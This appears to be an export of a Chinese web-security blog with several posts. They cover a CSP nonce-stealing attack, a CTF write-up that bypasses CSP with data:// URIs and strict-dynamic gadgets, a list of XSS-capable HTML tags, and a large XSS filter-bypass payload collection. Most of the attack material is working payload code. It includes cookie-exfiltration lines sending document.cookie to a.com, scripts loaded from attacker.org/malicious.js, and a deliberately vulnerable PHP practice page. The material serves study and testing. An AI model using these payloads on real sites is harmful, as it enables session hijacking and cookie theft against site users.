12345678910111213141516171819202122232425262728&lt;iframe id=&quot;frame&quot; src=&quot;http://127.0.0.1/csp-test.php#&lt;form method=&apos;post&apos; action=&apos;http://127.0.0.1/nonce_receiver.php&apos;&gt;&lt;input type=&apos;submit&apos; value=&apos;test!&apos;&gt;&lt;textarea name=&apos;nonce&apos;&gt;&quot;&gt;&lt;/iframe&gt;&lt;script&gt; function getNonce() &#123; var xhr = new XMLHttpRequest(); xhr.open(&quot;GET&quot;, &quot;nonce_receiver.php&quot;, false); xhr.send(); return xhr.responseText; &#125; setTimeout(pollNonce, 1000); function pollNonce() &#123; var nonce = getNonce(); if (nonce == &quot;&quot;) &#123; setTimeout(pollNonce, 1000); &#125; else &#123; attack(nonce); &#125; &#125; function attack(nonce) &#123; var iframe = document.createElement(&quot;iframe&quot;); var url = &quot;http://127.0.0.1/csp-test.php#&quot; var payload = &quot;&lt;script nonce=&apos;&quot; + nonce + &quot;&apos;&gt;alert(document.cookie)&lt;/scr&quot; + &quot;ipt&gt;&quot; var validationPayload = &quot;&lt;script&gt;alert(&apos;If you see this alert, CSP is not active&apos;)&lt;/scr&quot; + &quot;ipt&gt;&quot; iframe.src = url + payload + validationPayload; document.body.appendChild(iframe); &#125;&lt;/script&gt; 然后我们需要一个页面去获取nonce字符串，为了反复获得，这里需要开启session。 nonce_receiver.php： 123456789101112&lt;?phpsession_start();if(!empty($_POST))&#123; $message = $_POST['nonce']; preg_match('/(nonce=\')\w+\'/', $message, $matches); $nonce_number = substr($matches[0], 7, -1); $_SESSION['nonce'] = $nonce_number; echo $nonce_number;&#125;else if(!empty($_SESSION['nonce']))&#123; echo $_SESSION['nonce'];&#125;?&gt; 一切就绪了，唯一的问题就是在nonce script上，由于csp开启的问题，我们没办法自动实现自动提交，也就是攻击者必须要使按钮被点击，才能实现一次攻击。 可以看到csp-test.php中的cookie被带回来了： 10、利用wave文件绕过script-src ‘self’具体参考使用 Wave 文件绕过 CSP 策略。 0x04 参考CSP策略及绕过方法 通过iframe标签绕过csp CSP学习和绕过]]></content>
      <categories>
        <category>Web安全基础</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一道绕过CSP的XSS题目]]></title>
    <url>%2F2019%2F02%2F21%2F%E4%B8%80%E9%81%93%E7%BB%95%E8%BF%87CSP%E7%9A%84XSS%E9%A2%98%E7%9B%AE%2F</url>
    <content type="text"><![CDATA[之前CTF做的一道需要绕过CSP的XSS题目，具体的代码没记下来，这里写个类似的来复现。 题目分析这里由于是本地写的类似程序，目标为弹框显示“1”即可。 访问目标站点，如下图所示，看到提示输入URL： 啥也不输入，点击Go，发现URL栏多了name参数和url参数： 查看源码，发现查看不到页面上显示的“Mi1k7ea”，推测应该是动态插入DOM生成的吧，右键查看元素，看到如下结构： 其中在header头和最后各包含一段JS代码，其中的script标签都含有nonce属性，推测应该是采用了CSP策略，多次访问nonce属性值都不一样，即是随机生成的。中间是URL栏中name参数的插入点，插入到id为”yourname”的a标签中显示到页面中。 这里可以看到，header头的JS代码是对DOM的动态操作，$(document).read即页面加载完执行；最后的JS代码为处理URL和创建Node，然后被前面的JS动态插入DOM节点中。 既然涉及到了CSP，抓包看看它设置的策略吧： 其CSP设置如下： Content-Security-Policy: default-src ‘none’; script-src ‘nonce-96a80ac6288a465630f4e631bf2f192e’ ‘strict-dynamic’; base-uri ‘self’; style-src ‘self’; font-src ‘self’ 关键点应该是前两个，即default-src ‘none’;和script-src ‘nonce-xx’ ‘strict-dynamic’; 因为前面header头的JS是动态添加DOM节点的，推测应该和strict-dynamic这个相关，可参考black hat 2017关于script gadgets绕过CSP。 XSS payload注入从前面的题目分析可知，页面的输入点有两处，即GET方式的name参数和url参数。 其中name参数是输入到id为”yourname”的a标签中，尝试对其进行XSS测试，发现会直接返回输入的内容，即已经实体编码了，利用点应该不在这： 另一个参数url，可通过input栏输入提交，尝试输入标签内容，发现提示输入内容为非法URL： 那就输入一个外部URL地址如本博客，发现提示只能输入服务端本身的URL，即应该限定了只能输入访问本地的URL，并且限制了只能是协议://ip:port这种形式才能正常执行： 本地有个test.txt文件可以访问，输入该文件地址，可以查看到页面将文件内容直接输出到pre标签中，这里可以推测，后台应该是调用file_get_content()来获取目标URL内容的： 那么问题来了，限制了只能通过协议://ip:port这种形式来作为开头输入，并且限定只能是服务端的IP，那不就没法注入XSS payload了？ 当时卡在这里卡了很久，后面发现，这是PHP的题目，是不是可以利用PHP伪协议？要想输入的内容能显现在页面中，能与之相关联的伪协议即data://伪协议。 测试一下，在输入框输入： 12data://127.0.0.1/;base64,PGltZz4=其中PGltZz4=为&lt;img&gt;的base64编码结果 检查元素可以看到，img标签成功插入到页面中显示出来。 接下来直接插入script标签尝试弹框： 12data://127.0.0.1/;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==为&lt;script&gt;alert(1)&lt;/script&gt;的base64编码结果 发现标签是插进去了，但是没有弹框，意料之中，我们的script标签没有nonce值，被CSP策略拦截不可执行了： CSP绕过关于CSP绕过，这里主要有两种方式。主要参考自CSP策略及绕过方法。 利用浏览器补全功能绕过由前面知道，我们的script标签由于没有nonce，而CSP中设置的其中一条 script-src ‘nonce-xx’ ‘strict-dynamic’; 限定了有随机nonce值或由有nonce的标签动态生成的script才能执行。 这里关注前面的script-src ‘nonce-xx’，我们想一下，是不是可以劫持某个script标签的nonce属性呢？ 在参考的文章中说到： 也就是说，利用浏览器补全的功能，在含有nonce的script标签前面的插入点插入script标签的同时，插入a=”以闭合后面script标签的第一个属性的双引号，从而使中间的内容失效，将本来的nonce属性劫持到了插入的script标签中，使得该插入标签可以正常执行JS代码，也就是说浏览器会给我们自动补全只有一个双引号的属性的值。 我们回过头来看看页面代码布局，可以看到在插入的标签后面在一段拥有nonce属性的script标签，就是它了： 构造payload：我们需要先闭合掉前面的pre和form标签，然后再插入script标签；在script标签中，先写入包含远程恶意js代码文件的src属性，再添加a=”。即 12将 &lt;/pre&gt;&lt;/form&gt;&lt;script src=&quot;http://192.168.248.1/a.js&quot; a=&quot; Base64加密即可data://127.0.0.1/;base64,PC9wcmU+PC9mb3JtPjxzY3JpcHQgc3JjPSJodHRwOi8vMTkyLjE2OC4yNDguMS9hLmpzIiBhPSI= 直接输入payload访问： 成功弹框，没有问题。 再看一下页面元素： 这里再解释一遍，把pre和form标签闭合之后，输入&lt;script src=xxx a=&quot;的内容，由于浏览器的补全功能，a标签的双引号会和最后的script标签的第一个元素即type的双引号闭合掉，从而使中间的内容即第一个红框内的内容无效，导致后面的内容自己成为新的属性，包括nonce属性，从而成功劫持了最后的script标签的nonce属性为插入的script属性，最终成功执行。 但是上述的a标签在Chrome上是执行不了的，原因在于Chrome对于标签的解析方式则不同，Chrome中解析script标签的优先级高于解析属性双引号内的值，因而前面双引号闭合的时候没法正常使其失效。但是这里可以使用src属性替代，使其可在Chrome下正常执行。 利用strict-dynamic结合gadget绕过这里探讨第二种方法。 前面知道，CSP设置了strict-dynamic，结合查阅的Black Hat 2017的文章可知，我们可以在页面上找一个可以动态生成DOM节点的JS Gadget，然后通过某些方式来劫持其中的DOM节点元素，从而使动态生成的标签可以继承该Gadget的nonce直接执行JS代码。 我们再分析一遍源码： 由之前的分析知道，最后的script标签中是处理URL和创建节点，然后再被head处的JS动态插入到DOM节点中。DOM元素id即为全局变量。我们注意到最后的script标签的JS代码中定义了一个全局变量i，而i在head处的JS代码中被动态添加到id为forminput的标签中（即绿框框中的div标签），并且当i.name不为空时，将i.name的值设置到id为yourname的标签中（即绿框框中的a标签）。这里看到，div标签在a标签前面，也就是说，我们可以通过闭合使最后的JS代码失效，从而可以劫持i，再通过i来创建新标签来劫持yourname；最后看到蓝框，params[“name”]可以通过创建一个新的标签，其分别有两个属性，id属性值为params，name属性值为要执行的JS代码，接着将id为yourname的标签设置为script标签即可（因为蓝框中的代码就是将id为params的标签的name属性值放入id为yourname的标签中，进而实现将恶意Js代码放入script标签中）。由strict-dynamic知，head的JS代码动态创建的JS是受信任的，因此该动态创建的script标签可以执行恶意JS代码。 构造payload：先闭合掉pre和form标签，至于最后面的script可以通过在最后输入&lt;script&gt;来使其失效；id为yourname的标签为script标签，但该标签没有name属性、需要多输入一个包含name属性且id为params的标签；因此，劫持i的标签需可以内嵌多个标签。 1&lt;/pre&gt;&lt;/form&gt;&lt;div id="i"&gt;&lt;script id="yourname"&gt;&lt;/script&gt;&lt;a id="params" name="alert(1)" /&gt;&gt;&lt;/div&gt;&lt;script&gt; 当然div标签可以换成span、form等，textarea标签可换成input、textarea、button、iframe、object等标签，效果一样。 Base64编码后添加到data://伪协议后面构造最终payload： 1data://127.0.0.1/plain;base64,PC9wcmU+PC9mb3JtPjxkaXYgaWQ9ImkiPjxzY3JpcHQgaWQ9InlvdXJuYW1lIj48L3NjcmlwdD48YSBpZD0icGFyYW1zIiBuYW1lPSJhbGVydCgxKSIgLz4+PC9kaXY+PHNjcmlwdD4= 直接输入运行，弹框了： 查看元素，看到箭头处输入的script标签将后面的JS代码闭合失效了，而在红框id为forminput的div标签内，动态创建了id为i的div标签，该标签内含有一个id为yourname的script标签和id为params、name为恶意JS代码的a标签： 至此，我们成功利用strict-dynamic结合gadget来绕过CSP实现XSS弹框了。 能够弹框，就肯定能够执行其他XSS payload了，如返回cookie的payload如下： 123&lt;/pre&gt;&lt;/form&gt;&lt;div id=&quot;i&quot;&gt;&lt;script id=&quot;yourname&quot;&gt;&lt;/script&gt;&lt;a id=&quot;params&quot; name=&quot;window.open(&apos;//a.com/?&apos;+escape(document.cookie))&quot; /&gt;&gt;&lt;/div&gt;&lt;script&gt;或&lt;/pre&gt;&lt;/form&gt;&lt;div id=&quot;i&quot;&gt;&lt;script id=&quot;yourname&quot;&gt;&lt;/script&gt;&lt;a id=&quot;params&quot; name=&quot;window.location.href=&apos;http://a.com/?cookie=&apos;+document.cookie&quot; /&gt;&gt;&lt;/div&gt;&lt;script&gt; 模仿写的源码以下为模仿写的代码，仅供参考练习。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?php$this_host = $_SERVER['HTTP_HOST'];setcookie('flag', 'xxctf&#123;Mi1k7ea&#125;');$nonce = md5(openssl_random_pseudo_bytes(16));header("Content-Security-Policy: default-src 'none'; script-src 'nonce-$nonce' 'strict-dynamic'; base-uri 'self'; style-src 'self'; font-src 'self'");?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;CSP Test&lt;/title&gt; &lt;script type="text/javascript" src="/static/jquery-3.3.1.js" nonce=&lt;?php echo $nonce;?&gt;&gt;&lt;/script&gt; &lt;script type="text/javascript" nonce=&lt;?php echo $nonce;?&gt;&gt; $(document).ready(function()&#123; $("#forminput").append(i); if (location.search.indexOf("name=") != -1) &#123; $("#yourname").text(params["name"]) &#125;; &#125;) &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;form action="csp.php" method="get"&gt; &lt;div id="forminput"&gt; &lt;input type="text" name="name" value="Mi1k7ea" hidden="true"&gt; &lt;button type="submit"&gt;Go&lt;/button&gt; &lt;/div&gt; &lt;h3&gt;Hi, &lt;a id="yourname"&gt;&lt;/a&gt; :)&lt;/h3&gt; &lt;?php if (isset($_GET['url'])) &#123; $x = @$_GET['url']; if (filter_var($x, FILTER_VALIDATE_URL)) &#123; $r = parse_url($x); if (isset($r['port'])) &#123; $r['host'] = $r['host'].":".$r['port']; &#125; if (preg_match("/&#123;$this_host&#125;$/i", $r['host'])) &#123; $a = file_get_contents($x); echo ("Result: &lt;pre&gt;".$a."&lt;/pre&gt;"); &#125; else &#123; echo "&lt;script nonce=&#123;$nonce&#125;&gt;alert('You can only input &#123;$this_host&#125;')&lt;/script&gt;"; &#125; &#125; else &#123; echo "Invaild URL!"; &#125; &#125; ?&gt;&lt;/form&gt;&lt;script type="text/javascript" nonce=&lt;?php echo $nonce;?&gt;&gt; url_param = new URL(location.href).searchParams params = &#123;&#125; for(value of url_param.keys())&#123; params[value] = url_param.get(value); &#125; var i = document.createElement("input"); i.name = "url"; i.type = "text"; if (location.search.indexOf("post=") != -1) &#123; i.value = params["post"]; &#125;else&#123; i.placeholder = "input url..."; &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>WriteUp:Web</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一些加载XSS Payload的标签]]></title>
    <url>%2F2019%2F02%2F19%2F%E4%B8%80%E4%BA%9B%E5%8A%A0%E8%BD%BDXSS-Payload%E7%9A%84%E6%A0%87%E7%AD%BE%2F</url>
    <content type="text"><![CDATA[之前整理的一些可以加载XSS Payload的标签，后面还会继续更新。 script标签这个标签不用多说。 123456789&lt;script&gt;alert(1)&lt;/script&gt;&lt;script src="http://127.0.0.1/a.js"&gt;&lt;/script&gt;&lt;script&gt;eval("\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029")&lt;/script&gt;&lt;script&gt;eval("\x61\x6c\x65\x72\x74\x28\x31\x29")&lt;/script&gt;&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;/script&gt;&lt;script&gt;var x=eval;x(alert(1));&lt;/script&gt;&lt;script&gt;(1, 2, eval)(alert(1))&lt;/script&gt;&lt;script&gt;eval.call(null, 'alert(1)')&lt;/script&gt;&lt;script&gt;Mi1k7ea();function Mi1k7ea()&#123;alert(1);&#125;&lt;/script&gt; a标签其实，利用到javascript伪协议的payload，可以不用添加引号。 123456&lt;a href=javascript:alert(1)&gt;Mi1k7ea&lt;/a&gt;&lt;a href=javascript:confirm(1)&gt;Mi1k7ea&lt;/a&gt;&lt;a href=# onclick=alert(1)&gt;Mi1k7ea&lt;/a&gt;&lt;a href=# onmouseover=alert(1)&gt;Mi1k7ea&lt;/a&gt;&lt;a href=# onmouseout=alert(1)&gt;Mi1k7ea&lt;/a&gt;//其他onmouse系列... img标签通常是触发onerror事件来执行js代码，当然也有其他事件可触发。 12345678910&lt;img src=x onerror=alert(1)&gt;&lt;img src="pain.jpg" onload=alert(1)&gt;&lt;img src=x onerror=alert(1)&gt;&lt;img src=x onclick=alert(1)&gt;&lt;img src="pain.jpg" onmouseout=alert(1)&gt;//其他onmouse系列...&lt;img src=x onerror=s=createElement('script');body.appendChild(s);s.src='http://127.0.0.1/a.js';&gt;//alert被过滤&lt;img src=x onerror=document.body.appendChild(document.createElement("scr"+"ipt")).src="http://127.0.0.1/a.js"&gt;&lt;img src=x onerror=eval("\x61\x6c\x65\x72\x74\x28\x31\x29")&gt;&lt;img src=x onerror=eval("&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;")&gt; body标签主要可利用onload、onpageshow等事件属性 1234&lt;body onload=alert(1)&gt;&lt;body/onload=alert(1)&gt;&lt;body onpageshow=alert(1)&gt;&lt;body/onpageshow=alert(1)&gt; svg标签svg标签可以和onload组合进行利用： 1234&lt;svg onload=alert(1)&gt;&lt;svg/onload=alert(1)&gt;&lt;svg onload=document.body.appendChild(document.createElement("scr"+"ipt")).src="http://127.0.0.1/a.js"&gt;&lt;svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))&gt; form标签form标签需要结合其中支持的标签和input标签才能成功触发。 123456789//onmouse系列&lt;form onmouseout=alert(1)&gt; &lt;input type="text"&gt;&lt;/form&gt;//利用action&lt;form action=javascript:alert(1)&gt; &lt;input type="submit"&gt;&lt;/form&gt; input标签1234567891011121314&lt;input onclick=alert(1)&gt;//支持onmouse系列&lt;input onmouseout=alert(1)&gt;//改变输入框内容时触发&lt;input type="text" onchange=alert(1)&gt;//结合form标签使用formaction属性&lt;form&gt;&lt;input type="submit" formaction="javascript:alert(1)"&gt;&lt;/form&gt;&lt;form&gt;&lt;input type="image" formaction="javascript:alert(1)"&gt;&lt;/form&gt;//通过Alt+Shift+自定义的字符（这里为M）触发，仅Firefox测试ok&lt;input type="hidden" accesskey="M" onclick=alert(1)&gt; style标签style标签可以和onload组合进行利用： 1&lt;style onload=alert(1) /&gt; iframe标签主要利用src属性来构造。 123456789&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;&lt;iframe onmouseout=alert(1)&gt;&lt;/iframe&gt;//其他onmouse系列...//base64加密内容为&lt;script&gt;alert(1)&lt;/script&gt;&lt;iframe width="0px" height="0px" src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" /&gt;//base64加密内容为&lt;script src="http://127.0.0.1/a.js"&gt;&lt;/script&gt;&lt;iframe width="0px" height="0px" src="data:text/html;base64,PHNjcmlwdCBzcmM9Imh0dHA6Ly8xMjcuMC4wLjEvYS5qcyI+PC9zY3JpcHQ+" /&gt;&lt;iframe src="javascript&amp;colon;alert&amp;lpar;1&amp;rpar;" /&gt;&lt;iframe src="data:text/html,&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;" /&gt;//谷歌可弹 object标签利用data伪协议。 1234//base64加密内容为&lt;script&gt;alert(1)&lt;/script&gt;&lt;object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" /&gt;//base64加密内容为&lt;script src="http://127.0.0.1/a.js"&gt;&lt;/script&gt;&lt;object data="data:text/html;base64,PHNjcmlwdCBzcmM9Imh0dHA6Ly8xMjcuMC4wLjEvYS5qcyI+PC9zY3JpcHQ+" /&gt; span标签通过Alt+Shift+自定义的字符（这里为M）触发，仅Firefox测试ok。 1&lt;span accesskey="M" onclick=alert(1)&gt;&lt;/span&gt; marquee标签Marquee 标签除了在web开发中有标签内容回滚作用之外，它还支持一系列的事件处理程序，因此可以用它来实现XSS Payload触发。Marquee支持的一系列事件处理程序如下： onbounce事件：是在marquee标签中的内容滚动到上下或左右边界时触发的事件处理程序，该事件只有在marquee标签的behavior属性设为alternate时才有效； onfinish事件：当 marquee 完成 loop 属性设置的值时触发。它只能在 loop 属性设置为大于 0 的某个数字时触发； onstart事件: 当 marquee 标签内容开始滚动时触发。 123&lt;marquee behavior="alternate" onstart=alert(1)&gt;Mi1k7ea&lt;/marquee&gt;&lt;marquee loop="1" onfinish=alert(1)&gt;Mi1k7ea&lt;/marquee&gt;&lt;marquee onstart=alert(1)&gt;Mi1k7ea&lt;/marquee&gt; Media类型标签Media类型标签的src属性加上javascript伪协议并不能触发XSS Payload。 audio标签和video标签的以下属性可用于触发payload。 oncanplay: 在用户可以开始播放音视频（audio/video）时触发； ondurationchange: 在音视频（audio/video）的时长发生变化时触发； onended: 在音视频（audio/video）播放结束时触发； onloadeddata: 在音视频数据帧加载时触发，也即在当前帧的数据加载完成且还没有足够的数据播放音视频（audio/video）的下一帧时触发； onloadedmetadata: 在指定音视频（audio/video）的元数据（如分辨率和时长）加载后触发； onloadstart: 在浏览器开始寻找指定音视频（audio/video）时触发； onprogress: 浏览器下载指定的音视频（audio/video）时触发； onsuspend: 在浏览器读取音视频（audio/video）数据中止时触发。 12345678910111213141516171819202122//audio标签，对应MP3文件&lt;audio oncanplay="alert(1)" src="test.mp3" /&gt;&lt;audio ondurationchange="alert(1)" src="test.mp3" /&gt;&lt;audio autoplay="true" onended="alert(1)" src="test.mp3" /&gt;&lt;audio onloadeddata="alert(1)" src="test.mp3" /&gt;&lt;audio onloadedmetadata="alert(1)" src="test.mp3" /&gt;&lt;audio onloadstart="alert(1)" src="test.mp3" /&gt;&lt;audio onprogress="alert(1)" src="test.mp3" /&gt;&lt;audio onsuspend="alert(1)" src="test.mp3" /&gt;&lt;audio src=x onerror=javascript:alert(1) /&gt;//video标签，对应MP4文件&lt;video oncanplay="alert(1)" src="test.mp4" /&gt;&lt;video ondurationchange="alert(1)" src="test.mp4" /&gt;&lt;video autoplay="true" onended="alert(1)" src="test.mp4" /&gt;&lt;video onloadeddata="alert(1)" src="test.mp4" /&gt;&lt;video onloadedmetadata="alert(1)" src="test.mp4" /&gt;&lt;video onloadstart="alert(1)" src="test.mp4" /&gt;&lt;video onprogress="alert(1)" src="test.mp4" /&gt;&lt;video onsuspend="alert(1)" src="test.mp4" /&gt;&lt;video src=x onerror=javascript:alert(1) /&gt;&lt;video src="test.mp4" onclick=alert(1) /&gt; 参考他山之石 | 对 XSS 的一次深入分析认识 xss其他标签下的js用法总结大全]]></content>
      <categories>
        <category>Web安全基础</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[个人XSS payload收集]]></title>
    <url>%2F2019%2F02%2F16%2F%E4%B8%AA%E4%BA%BAXSS-payload%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[这里为个人网上收集的XSS Payload，仅用于XSS攻击测试。 《xss绕过，payload全集》123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364通杀标签payload：&lt;aaaa id="c" onfocus="alert(1)" tabindex=0&gt; 1、script标签绕过进行一次移除操作：&lt;scr&lt;script&gt;ipt&gt;alert("XSS")&lt;/scr&lt;script&gt;ipt&gt;Script 标签可以用于定义一个行内的脚本或者从其他地方加载脚本：&lt;script&gt;alert("XSS")&lt;/script&gt;&lt;script src="http://attacker.org/malicious.js"&gt;&lt;/script&gt;1.2 JavaScript 事件我们可以像如下这样在元素中定义 JavaScript 事件：&lt;div onclick="alert('xss')"&gt;这个 JavaScript 代码当有人点击它后就会被执行，同时还有其他事件如页面加载或移动鼠标都可以触发这些事件。绝大部分的时间都被过滤器所移除了，但是依旧还有少量事件没有被过滤，例如，onmouseenter 事件：&lt;divonmouseenter="alert('xss')"&gt;当用户鼠标移动到 div 上时就会触发我们的代码。另一个绕过的办法就是在属性和= 之间插入一个空格：&lt;div onclick ="alert('xss')"&gt;1.3 行内样式(Inlinestyle)我们同样可以在行内样式里利用 IE 浏览器支持的动态特性：//IE5之后才支持&lt;div style="color: expression(alert('XSS'))"&gt;//experssion后执行的语句相当于javascript后执行的语句过滤器会检查关键字 style，随后跟随的不能是 &lt;，在随后是 expression：/style=[^&lt;]*((expression\s*?[&lt;]∗?)|(behavior\s*:))[^&lt;]*(?=\&gt;)/Uis所以，让我们需要把 &lt; 放到其他地方：&lt;div style="color: '&lt;'; color: expression(alert('XSS'))"&gt;1.4 CSS importIE 浏览器支持在 CSS 中扩展 JavaScript，这种技术称为动态特性(dynamic properties)。允许攻击者加载一个外部 CSS 样式表是相当危险的，因为攻击者现在可以在原始页面中执行 JavaScript 代码了。&lt;style&gt;@import url("http://attacker.org/malicious.css");&lt;/style&gt;malicious.css：body &#123; color: expression(alert('XSS'));&#125;为了绕过对 @import 的过滤，可以在 CSS 中使用反斜杠进行绕过：&lt;style&gt;@imp\ort url("http://attacker.org/malicious.css");&lt;/style&gt;IE 浏览器会接受反斜杠，但是我们绕过了过滤器。 1.5 Javascript URL链接标签里可以通过在 URL 中使用 javascript:… 来执行 JavaScript：&lt;a href="javascript:alert('test')"&gt;link&lt;/a&gt;上面的过滤会从代码中移除 javascript:，所以我们不能直接这么写代码。但我们可以尝试改变 javascript:的写法，使它依旧可以被浏览器执行但又不匹配正则表达式。首先来尝试下 URL 编码：&lt;a href="Java&amp;#115;cript:alert('xss')"&gt;link&lt;/a&gt;上面这段代码不匹配正则表达式，但是浏览器依旧会执行它，因为浏览器会首先进行 URL 解码操作。另外，我们还可以使用 VBScript，虽然它在 IE11 中被禁用了，但依旧可以运行在旧版本的 IE 或者启用兼容模式的 IE11 上。我们可以使用类似上面 JavaScript 的方式来插入 VBScript 代码：&lt;a href='vbscript:MsgBox("XSS")'&gt;link&lt;/a&gt;'-confirm`1`-''-confirm(1)-' 1.6 利用字符编码%c1;alert(/xss/);//1.7 绕过长度限制"onclick=alert(1)//"&gt;&lt;!----&gt;&lt;script&gt;alert(xss);&lt;script&gt;1.8 使用&lt;base&gt;标签&lt;script&gt;alert(navigator.userAgent)&lt;script&gt;&lt;script&gt;alert(88199)&lt;/script&gt;&lt;script&gt;confirm(88199)&lt;/script&gt;&lt;script&gt;prompt(88199)&lt;/script&gt;&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(88199)&lt;/script&gt;&lt;script&gt;+alert(88199)&lt;/script&gt;&lt;script&gt;alert(/88199/)&lt;/script&gt;&lt;script src=data:text/javascript,alert(88199)&gt;&lt;/script&gt;&lt;scriptsrc=&amp;#100&amp;#97&amp;#116&amp;#97:text/javascript,alert(88199)&gt;&lt;/script&gt;&lt;script&gt;alert(String.fromCharCode(49,49))&lt;/script&gt;&lt;script&gt;alert(/88199/.source)&lt;/script&gt;&lt;script&gt;setTimeout(alert(88199),0)&lt;/script&gt;&lt;script&gt;document['write'](88199);&lt;/script&gt;&lt;anytag onmouseover=alert(15)&gt;M&lt;anytag onclick=alert(16)&gt;M&lt;a onmouseover=alert(17)&gt;M&lt;a onclick=alert(18)&gt;M&lt;a href=javascript:alert(19)&gt;M&lt;button/onclick=alert(20)&gt;M&lt;form&gt;&lt;buttonformaction=javascript&amp;colon;alert(21)&gt;M&lt;form/action=javascript:alert(22)&gt;&lt;input/type=submit&gt;&lt;form onsubmit=alert(23)&gt;&lt;button&gt;M&lt;form onsubmit=alert(23)&gt;&lt;button&gt;M&lt;img src=x onerror=alert(24)&gt; 29&lt;body/onload=alert(25)&gt;&lt;bodyonscroll=alert(26)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;&lt;iframe src="http://0x.lv/xss.swf"&gt;&lt;/iframe&gt;&lt;iframe/onload=alert(document.domain)&gt;&lt;/iframe&gt;&lt;IFRAME SRC="javascript:alert(29);"&gt;&lt;/IFRAME&gt;&lt;meta http-equiv="refresh" content="0;url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2830%29%3C%2%73%63%72%69%70%74%3E"&gt;^_^&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+&gt;&lt;/object&gt;&lt;object data="javascript:alert(document.domain)"&gt;&lt;marquee onstart=alert(30)&gt;&lt;/marquee&gt;&lt;isindex type=image src=1 onerror=alert(31)&gt;&lt;isindex action=javascript:alert(32) type=image&gt;&lt;input onfocus=alert(33) autofocus&gt;&lt;input onblur=alert(34) autofocus&gt;&lt;input autofocus&gt; 2.2.1 如果大小写不行的话，&lt;script&gt;被过滤尝试&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;； 2.2.2使用&lt;a&gt;标签测试&lt;a href=“http://www.google.com"&gt;Clickme&lt;/a&gt;&lt;a被过滤？href被过滤？其他内容被过滤？如果没有过滤尝试使用&lt;a href=”javascript:alert(1)”&gt;Clickme&lt;/a&gt;尝试使用错误的事件查看过滤&lt;a href="rhainfosec.com"onclimbatree=alert(1)&gt;ClickHere&lt;/a&gt;HTML5拥有150个事件处理函数，可以多尝试其他函数&lt;body/onhashchange=alert(1)&gt;&lt;a href=#&gt;clickit2.3 测试其他标签src属性&lt;img src=x onerror=prompt(1);&gt;&lt;img/src=aaa.jpg onerror=prompt(1);&lt;video src=x onerror=prompt(1);&gt;&lt;audio src=x onerror=prompt(1);&gt;iframe&lt;iframesrc="javascript:alert(2)"&gt;&lt;iframe/src="data:text&amp;sol;html;&amp;Tab;base64&amp;NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="&gt;Embed&lt;embed/src=//goo.gl/nlX0P&gt;Action&lt;form action="Javascript:alert(1)"&gt;&lt;input type=submit&gt;&lt;isindex action="javascript:alert(1)" type=image&gt;&lt;isindexaction=j&amp;Tab;a&amp;Tab;vas&amp;Tab;c&amp;Tab;r&amp;Tab;ipt:alert(1)type=image&gt;&lt;isindex action=data:text/html, type=image&gt;mario验证&lt;span class="pln"&gt; 